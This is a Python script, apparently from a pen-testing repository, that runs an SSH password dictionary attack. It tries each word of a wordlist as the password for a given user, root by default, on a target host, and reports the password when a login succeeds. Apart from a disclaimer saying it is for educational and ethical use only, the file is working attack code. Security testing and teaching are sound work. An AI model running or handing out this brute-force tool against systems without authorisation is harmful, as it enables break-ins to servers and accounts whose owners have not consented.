# Connor Sanders
# 10/15/2017
# Tested and Developed on Python 2.7 and 3.5 / Configured for Windows, Linux, and Mac

# Strictly For Educational/Ethical Pen Testing Purposes ONLY. I condone no illegal activities with this script
# Use of this code for unlawful purposes is wrong in every sense of the word, a crime, and strictly discouraged
# To help discourage/limit illegal use of my code, advanced functionality of the script has been removed/limited
# All sample dictionary files provided in this repo were 100% legally created and include their own license/disclaimer

# How to use the code:
#   python ssh_dictionary_attack.py
#    "target_host" - Host you wish to 'hack'
#    "selected_dictionary" - Dictionary located in the dictionaries directory folder you want to use
#    "user_name" - Name of the user we are trying to log in as
#    "port_number" *Optional - default is 22*

#   Usage examples:
#     python ssh_dictionary_attack.py "domain.com" "Top196-probable.txt" "root"

import pip
import os
import sys
import socket


# Package installer
def install(package):
    pip.main(['install', package])

try:
    import paramiko
except:
    print('paramiko package for Python not found, pip3 installing now....')
    install('paramiko')
    import paramiko
    print('paramiko package has been successfully installed for Python\n Continuing Process...')

os_system = os.name
if os_system == 'nt':
    dict_dir = '\\dictionaries\\'
else:
    dict_dir = '/dictionaries/'

# Function that attempts an ssh connection attempt
def ssh_attempt(host, password_try, u_name, port_num):
    return_code = 0
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=port_num, username=u_name, password=password_try)
    except paramiko.AuthenticationException:
        print('[!]------> ' + password_try + ' is an incorrect password!')
        return_code = 1
    except socket.error:
        print('[!]------>  Connection Failed!')
        return_code = 2
    ssh.close()
    return return_code

# Function called to launch ssh dictionary attack
def run_ssh_attack(host, selected_dictionary, user_name='root', port_number=22):
    cwd = os.getcwd()
    sel_dict = open(cwd + dict_dir + selected_dictionary, "r")
    for word in sel_dict:
        print(word)
        try:
            res = ssh_attempt(host, word, user_name, port_number)
            if res == 0:
                print("[*]--------> Success!\n [*]---------->" + user_name + "'s Password Determined: " + word)
                sys.exit(0)
            elif res == 1:
                print("[!]--------> Incorrect Password: " + word)
            elif res == 2:
                print("[!]--------> Unable to connect to: " + host)
        except:
            pass
    sel_dict.close()


if __name__ == "__main__":
    if len(sys.argv) == 3:
        run_ssh_attack(sys.argv[1], sys.argv[2])
    elif len(sys.argv) == 4:
        run_ssh_attack(sys.argv[1], sys.argv[2], sys.argv[3])
    elif len(sys.argv) == 5:
        run_ssh_attack(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
    else:
        print('Incorrect Script Parameters Entered!')
        sys.exit(1)
        